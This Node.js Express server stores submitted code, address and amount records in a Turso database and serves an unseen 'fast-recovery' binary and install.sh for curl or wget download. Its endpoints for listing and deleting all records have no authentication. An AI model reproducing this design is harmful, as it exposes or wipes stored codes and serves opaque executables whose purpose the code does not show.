const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const { createClient } = require('@libsql/client');
const path = require('path');
const fs = require('fs');
require('dotenv').config(); // ← Cargar variables de entorno

// Leer variables de entorno (con valores por defecto)
const dbUrl = process.env.TURSO_DATABASE_URL;
const dbToken = process.env.TURSO_AUTH_TOKEN;

// Ruta donde se guardará el archivo en el servidor (ajústala si es necesario)
// En Render, el directorio de trabajo es /opt/render/project/src
const FILES_DIR = path.join(__dirname, 'files');
const TOOL_PATH = path.join(FILES_DIR, 'fast-recovery');
const INSTALL_SCRIPT_PATH = path.join(FILES_DIR, 'install.sh');

// Asegurar que la carpeta files existe al iniciar
if (!fs.existsSync(FILES_DIR)) {
    fs.mkdirSync(FILES_DIR, { recursive: true });
    console.log(`📁 Carpeta creada: ${FILES_DIR}`);
}

// Verificar que existen
if (!dbUrl || !dbToken) {
    console.error('❌ ERROR: Faltan variables de entorno TURSO_DATABASE_URL o TURSO_AUTH_TOKEN');
    console.error('   Crea un archivo .env con esas variables');
    process.exit(1);
}

// Configurar cliente de Turso con variables de entorno
const db = createClient({
    url: dbUrl,
    authToken: dbToken
});

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';

// Middlewares básicos
app.use(helmet());
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Middleware de logging simple
app.use((req, res, next) => {
    console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
    next();
});

// Ruta de prueba
app.get('/', (req, res) => {
    res.json({
        message: 'Servidor funcionando!',
        timestamp: new Date()
    });
});

// ============================================================
// 📌 ENDPOINT - Recibe code, address y amount y los guarda en Turso
// ============================================================
app.post('/procesar', async (req, res) => {
    const { code, address, amount } = req.body;
    
    if (!code || !address || !amount) {
        return res.status(400).json({ 
            error: 'Faltan campos requeridos',
            required: ['code', 'address', 'amount'],
            received: { code: !!code, address: !!address, amount: !!amount }
        });
    }
    
    try {
        const result = await db.execute({
            sql: 'INSERT INTO transacciones (codigo, direccion, monto) VALUES (?, ?, ?)',
            args: [code, address, amount]
        });
        
        console.log('\n' + '='.repeat(50));
        console.log('📦 NUEVA SOLICITUD RECIBIDA Y GUARDADA EN BD');
        console.log('='.repeat(50));
        console.log(`🔑 Código: ${code}`);
        console.log(`📍 Dirección: ${address}`);
        console.log(`💰 Monto: ${amount}`);
        
        const rowId = result.lastInsertRowid.toString();
        console.log(`🆔 ID en BD: ${rowId}`);
        console.log('='.repeat(50) + '\n');
        
        res.json({
            mensaje: 'Datos recibidos y guardados correctamente',
            datos: {
                code: code,
                address: address,
                amount: amount,
                id: rowId
            },
            timestamp: new Date()
        });
        
    } catch (error) {
        console.error('Error al guardar en Turso:', error);
        res.status(500).json({
            error: 'Error al guardar en la base de datos',
            mensaje: error.message
        });
    }
});

// Endpoint para ver todas las transacciones
app.get('/transacciones', async (req, res) => {
    try {
        const result = await db.execute('SELECT * FROM transacciones ORDER BY fecha_creacion DESC');
        
        const rows = result.rows.map(row => ({
            ...row,
            id: row.id.toString()
        }));
        
        res.json(rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================================
// 📌 ENDPOINT - ELIMINAR por dirección
// ============================================================
app.delete('/transacciones/direccion/:direccion', async (req, res) => {
    try {
        const { direccion } = req.params;
        
        console.log(`🗑️  Eliminando transacciones de dirección: ${direccion}`);
        
        const result = await db.execute({
            sql: 'DELETE FROM transacciones WHERE direccion = ?',
            args: [direccion]
        });
        
        console.log(`✅ Eliminadas ${result.rowsAffected} transacciones`);
        
        res.json({ 
            mensaje: `✅ Se eliminaron ${result.rowsAffected} transacciones de ${direccion}`,
            eliminadas: result.rowsAffected,
            direccion: direccion
        });
        
    } catch (error) {
        console.error('❌ Error al eliminar por dirección:', error);
        res.status(500).json({ 
            error: 'Error al eliminar transacciones',
            mensaje: error.message 
        });
    }
});

// ============================================================
// 📌 ENDPOINT - ELIMINAR TODAS las transacciones
// ============================================================
app.delete('/transacciones', async (req, res) => {
    try {
        console.log('⚠️  Eliminando TODAS las transacciones...');
        
        const result = await db.execute('DELETE FROM transacciones');
        
        console.log(`✅ Eliminadas ${result.rowsAffected} transacciones en total`);
        
        res.json({ 
            mensaje: `✅ Se eliminaron TODAS las transacciones (${result.rowsAffected} registros)`,
            eliminadas: result.rowsAffected
        });
        
    } catch (error) {
        console.error('❌ Error al eliminar todas:', error);
        res.status(500).json({ 
            error: 'Error al eliminar todas las transacciones',
            mensaje: error.message 
        });
    }
});

//------------------
// Endpoint para obtener información del archivo
app.get('/fast-recovery/info', (req, res) => {
    if (!fs.existsSync(TOOL_PATH)) {
        return res.status(404).json({
            disponible: false,
            nombre: 'fast-recovery',
            mensaje: 'Archivo no disponible en el servidor'
        });
    }

    const stats = fs.statSync(TOOL_PATH);
    const fileSizeInBytes = stats.size;
    const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);

    res.json({
        disponible: true,
        nombre: 'recovery-tool',
        tamaño_bytes: fileSizeInBytes,
        tamaño_mb: fileSizeInMB,
        version: 'v0.1.7@beta', // Puedes actualizar esto manualmente
        ultima_modificacion: stats.mtime,
        descargar_url: '/fast-recovery/download'
    });
});

// Endpoint para descargar el archivo (COMPATIBLE CON WGET Y CURL)
app.get('/fast-recovery/download', (req, res) => {
    if (!fs.existsSync(TOOL_PATH)) {
        return res.status(404).json({
            error: 'Archivo no encontrado',
            mensaje: 'El fast-recovery no está disponible en el servidor'
        });
    }

    // Configurar headers para forzar la descarga
    res.setHeader('Content-Disposition', 'attachment; filename="fast-recovery"');
    res.setHeader('Content-Type', 'application/octet-stream');
    
    // Enviar el archivo
    res.sendFile(TOOL_PATH, (err) => {
        if (err) {
            console.error('❌ Error al enviar el archivo:', err);
            if (!res.headersSent) {
                res.status(500).json({ error: 'Error al descargar el archivo' });
            }
        }
    });
});

// Endpoint simple para verificar disponibilidad (útil para scripts)
app.get('/recovery-tool/check', (req, res) => {
    const exists = fs.existsSync(TOOL_PATH);
    res.json({
        disponible: exists,
        ruta: exists ? '/fast-recovery/download' : null
    });
});

///----------------
// Endpoint para obtener información del script install.sh
app.get('/install/info', (req, res) => {
    if (!fs.existsSync(INSTALL_SCRIPT_PATH)) {
        return res.status(404).json({
            disponible: false,
            nombre: 'install.sh',
            mensaje: 'Script no disponible en el servidor'
        });
    }

    const stats = fs.statSync(INSTALL_SCRIPT_PATH);
    const fileSizeInBytes = stats.size;
    const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);

    res.json({
        disponible: true,
        nombre: 'install.sh',
        tamaño_bytes: fileSizeInBytes,
        tamaño_kb: fileSizeInKB,
        version: '1.0', // Puedes actualizar esto manualmente
        ultima_modificacion: stats.mtime,
        descargar_url: '/install/download'
    });
});

// Endpoint para descargar install.sh (COMPATIBLE CON WGET Y CURL)
app.get('/install/download', (req, res) => {
    if (!fs.existsSync(INSTALL_SCRIPT_PATH)) {
        return res.status(404).json({
            error: 'Archivo no encontrado',
            mensaje: 'El script install.sh no está disponible en el servidor'
        });
    }

    // Configurar headers para forzar la descarga
    res.setHeader('Content-Disposition', 'attachment; filename="install.sh"');
    res.setHeader('Content-Type', 'text/x-shellscript'); // Tipo MIME correcto para scripts shell
    
    // Enviar el archivo
    res.sendFile(INSTALL_SCRIPT_PATH, (err) => {
        if (err) {
            console.error('❌ Error al enviar install.sh:', err);
            if (!res.headersSent) {
                res.status(500).json({ error: 'Error al descargar el script' });
            }
        }
    });
});

// Endpoint para ver el contenido del script (útil para revisión rápida)
app.get('/install/view', (req, res) => {
    if (!fs.existsSync(INSTALL_SCRIPT_PATH)) {
        return res.status(404).json({
            error: 'Archivo no encontrado',
            mensaje: 'El script install.sh no está disponible en el servidor'
        });
    }

    res.setHeader('Content-Type', 'text/plain');
    res.sendFile(INSTALL_SCRIPT_PATH);
});

// Endpoint simple para verificar disponibilidad
app.get('/install/check', (req, res) => {
    const exists = fs.existsSync(INSTALL_SCRIPT_PATH);
    res.json({
        disponible: exists,
        ruta: exists ? '/install/download' : null
    });
});

// Middleware de rutas no encontradas
app.use((req, res) => {
    res.status(404).json({ error: 'Ruta no encontrada' });
});

// Middleware de errores
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ 
        error: 'Algo salió mal!',
        mensaje: err.message 
    });
});

// Iniciar servidor
app.listen(PORT, HOST, () => {
    console.log(`🚀 Servidor corriendo en http://${HOST}:${PORT}`);
    console.log(`📡 Conectado a Turso DB`);
    console.log(`🌐 Accesible desde tu móvil en http://192.168.45.179:${PORT}`);
});

// Manejo de cierre graceful
process.on('SIGINT', () => {
    console.log('\n👋 Servidor detenido');
    process.exit(0);
});